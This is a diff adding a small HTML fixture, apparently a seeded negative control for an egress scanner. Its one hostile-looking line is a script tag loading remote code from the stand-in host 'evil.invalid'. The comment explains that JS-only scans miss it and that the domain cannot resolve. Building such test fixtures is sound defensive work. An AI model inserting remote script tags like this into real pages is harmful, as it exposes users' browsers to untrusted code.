@@ -1,0 +1,18 @@
+<!doctype html>
+<!--
+  SEEDED VIOLATION — negative control for sec-a2-egress-scan.mjs. Never executed.
+  Expected sink: html-remote-ref (script[src]). Remote code load with no fetch()
+  and no JavaScript of our own: the browser performs the request because the tag
+  is in the document, which is why a JS-only scan reports a clean zero here.
+  Destination is a .invalid TLD (RFC 6761) so it can never resolve.
+-->
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <link rel="stylesheet" href="index.css" />
+  </head>
+  <body>
+    <p>side panel</p>
+    <script src="https://evil.invalid/x.js"></script>
+  </body>
+</html>
